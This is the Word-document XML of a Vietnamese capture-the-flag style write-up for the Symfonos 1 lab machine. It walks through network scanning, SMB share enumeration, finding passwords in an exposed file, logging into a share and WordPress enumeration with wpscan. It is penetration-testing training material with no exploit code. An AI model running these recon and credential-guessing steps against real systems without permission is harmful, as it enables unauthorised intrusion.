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8C23" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SYMFONOS 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FEF1EE" w14:textId="236E27D7" w:rsidR="006803BF" w:rsidRDefault="00000000" w:rsidP="00881693">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">IP máy Symfonos 1: </w:t>
      </w:r>
      <w:r w:rsidR="00881693">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.118</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">IP máy Kali: </w:t>
      </w:r>
      <w:r>
        <w:t>192.168.56.105</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D942D4A" w14:textId="642965A4" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Đường dẫn tải máy ảo và tài nguyên: </w:t>
      </w:r>
      <w:r w:rsidR="00881693" w:rsidRPr="00881693">
        <w:t>https://drive.google.com/open?id=13xmIa_lVQ8Hbw30phswyfslizyrwSOUI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089A2862" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Dò quét mạng và dịch vụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0BE96E" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xác định địa chỉ IP, cổng mở và phiên bản dịch vụ trên máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D06F2C8" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9CC9FC" w14:textId="326C25A4" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>netdiscover -i eth</w:t>
      </w:r>
      <w:r w:rsidR="00881693">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFD8E9B" w14:textId="6EDE1F02" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">nmap -A </w:t>
      </w:r>
      <w:r w:rsidR="00881693">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.118</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D54A3C7" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Netdiscover dò các thiết bị trong mạng nội bộ. Nmap với tùy chọn -A nhận diện hệ điều hành, phiên bản dịch vụ, chạy script mặc định và traceroute.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F779CEB" w14:textId="77777777" w:rsidR="00D27B88" w:rsidRDefault="00881693">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00D3D303" wp14:editId="1351E6FC">
            <wp:extent cx="6217920" cy="2658110"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="103867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3223" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2658110"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D94CCC" w14:textId="22B511A3" w:rsidR="00D27B88" w:rsidRDefault="00D27B88" w:rsidP="00D27B88">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="17726273" wp14:editId="391455F9">
            <wp:extent cx="6217920" cy="4655185"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="121968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82273" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="4655185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE378AE" w14:textId="190D2D86" w:rsidR="00D27B88" w:rsidRPr="00D27B88" w:rsidRDefault="00D27B88" w:rsidP="00D27B88">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Ktra dịch vụ web của địa chỉ ip vừa tìm được</w:t>
      </w:r>
      <w:r w:rsidRPr="00D27B88">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>và lưu ảnh về.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49721FC0" wp14:editId="3BE1594A">
            <wp:extent cx="6217920" cy="2397125"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="61620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9007" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2397125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E50A01" w14:textId="556E9C86" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Thu thập thông tin từ ảnh và SMB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABD9D1C" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tìm manh mối trong ảnh, liệt kê tài khoản và truy cập thư mục chia sẻ anonymous.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1740FF5C" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9EB451" w14:textId="6609C438" w:rsidR="00D27B88" w:rsidRPr="00D27B88" w:rsidRDefault="00000000" w:rsidP="00D27B88">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>strings image.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38224488" w14:textId="77777777" w:rsidR="00881693" w:rsidRPr="00881693" w:rsidRDefault="00000000" w:rsidP="00881693">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">enum4linux </w:t>
      </w:r>
      <w:r w:rsidR="00881693" w:rsidRPr="00881693">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.118</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6330B8D3" w14:textId="15ABF1A5" w:rsidR="006803BF" w:rsidRDefault="006803BF">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F2F720F" w14:textId="54182629" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>smbclient //</w:t>
      </w:r>
      <w:r w:rsidR="00881693">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.118</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A378982" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get attention.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA314D1" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6298E7" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cat attention.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D422FAB" w14:textId="4243B23A" w:rsidR="00390ABC" w:rsidRPr="00390ABC" w:rsidRDefault="00390ABC">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00390ABC">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>smbclient //192.168.56.118/helios -U helios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F8D21D" w14:textId="77777777" w:rsidR="0054315D" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">get research.txt </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17909CE1" w14:textId="258E5608" w:rsidR="006803BF" w:rsidRDefault="0054315D">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">get </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>todo.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DF17BE" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cat research.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F576938" w14:textId="4B977260" w:rsidR="0054315D" w:rsidRDefault="0054315D">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">cat </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>todo.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069E89C0" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Strings trích xuất chuỗi văn bản từ ảnh. Enum4linux và smbclient được dùng để thu thập thông tin SMB và tải các tệp gợi ý về Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1F08DD" w14:textId="77777777" w:rsidR="00390ABC" w:rsidRDefault="00D27B88">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70156899" wp14:editId="157539D4">
            <wp:extent cx="6217920" cy="2205990"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="97067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76097" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2205990"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFCD2C3" w14:textId="1C18B643" w:rsidR="00390ABC" w:rsidRDefault="00390ABC" w:rsidP="00390ABC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B14ED1F" wp14:editId="6CD9B4B9">
            <wp:extent cx="4962525" cy="1009650"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="77025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58522" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4962525" cy="1009650"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E220286" w14:textId="59F2CD4A" w:rsidR="00390ABC" w:rsidRDefault="00390ABC" w:rsidP="00390ABC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="52BA70B0" wp14:editId="558203DA">
            <wp:extent cx="3552825" cy="1714500"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="1922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6725" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3552825" cy="1714500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E67EB22" w14:textId="77777777" w:rsidR="00390ABC" w:rsidRDefault="00390ABC" w:rsidP="00390ABC">
      <w:r w:rsidRPr="00390ABC">
        <w:t>Kết quả xác định share anonymous cho phép truy cập ẩn danh, trong khi print$ và helios bị từ chối truy cập. Điều này cho thấy anonymous là mục tiêu cần kiểm tra tiếp theo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727F9867" w14:textId="0F20B408" w:rsidR="00390ABC" w:rsidRDefault="00390ABC" w:rsidP="00390ABC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="74A75CA9" wp14:editId="2AADB0A6">
            <wp:extent cx="6217920" cy="2697480"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="126586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63034" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2697480"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AECEA9B" w14:textId="47FAEC80" w:rsidR="0054315D" w:rsidRDefault="0054315D" w:rsidP="00390ABC">
      <w:r w:rsidRPr="0054315D">
        <w:lastRenderedPageBreak/>
        <w:t>Thư mục chia sẻ anonymous cho phép truy cập không cần xác thực. Từ tệp attention.txt, thu thập được ba mật khẩu tiềm năng là epidioko, qwerty và baseball. Các mật khẩu này có thể được sử dụng để kiểm tra đăng nhập vào tài khoản hoặc dịch vụ SMB khác</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35697EBB" w14:textId="2F720A4B" w:rsidR="0054315D" w:rsidRDefault="0054315D" w:rsidP="00390ABC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="54AB35F2" wp14:editId="49479846">
            <wp:extent cx="6217920" cy="2525395"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="11563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47979" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="2525395"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="436674D2" w14:textId="38C4EDBC" w:rsidR="00DA0779" w:rsidRDefault="00DA0779" w:rsidP="00390ABC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75E11A1D" wp14:editId="40B7145C">
            <wp:extent cx="6217920" cy="1040765"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="6942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3466" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1040765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A680A51" w14:textId="622F05B0" w:rsidR="00DA0779" w:rsidRDefault="00DA0779" w:rsidP="00390ABC">
      <w:r w:rsidRPr="00DA0779">
        <w:t>Tệp todo.txt chứa gợi ý về đường dẫn /h3l105. Đây có thể là một thư mục ẩn trên dịch vụ web của máy mục tiêu. Vì vậy, tiến hành kiểm tra đường dẫn http://192.168.56.118/h3l105 để tiếp tục quá trình thu thập thông tin.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF30C0C" w14:textId="68B04101" w:rsidR="00DA0779" w:rsidRPr="00390ABC" w:rsidRDefault="00DA0779" w:rsidP="00390ABC">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4CBAC18B" wp14:editId="2185A757">
            <wp:extent cx="6217920" cy="5240020"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="114242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27012" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="5240020"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="050365E0" w14:textId="77777777" w:rsidR="00390ABC" w:rsidRDefault="00390ABC" w:rsidP="00390ABC"/>
    <w:p w14:paraId="57F27980" w14:textId="38046108" w:rsidR="00390ABC" w:rsidRPr="00390ABC" w:rsidRDefault="00390ABC" w:rsidP="00390ABC"/>
    <w:p w14:paraId="1716D919" w14:textId="30EE8989" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Cấu hình tên miền và quét WordPress</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6293472E" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Ánh xạ tên miền symfonos.local và liệt kê plugin, người dùng WordPress.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471EAB45" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9D3DB2" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>vi /etc/hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7154C860" w14:textId="1B5EC893" w:rsidR="006803BF" w:rsidRDefault="00881693" w:rsidP="00881693">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.168.56.118</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> symfonos.local</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C980EAC" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wpscan --url http://symfonos.local/h3l105/ --enumerate p,u</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5077C9CE" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wpscan --url http://symfonos.local/h3l105/ --api-token [API TOKEN] --enumerate p,u</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E85BE34" w14:textId="77777777" w:rsidR="006803BF" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Thêm tên miền vào /etc/hosts để truy cập đúng virtual host. WPScan liệt kê plugin và tài khoản người dùng; API token bổ sung dữ liệu lỗ hổng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336233A2" w14:textId="77777777" w:rsidR="00094E12" w:rsidRDefault="00DA0779">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="284B45FE" wp14:editId="3E5AE439">
            <wp:extent cx="6217920" cy="1731645"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="73199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92942" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6217920" cy="1731645"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
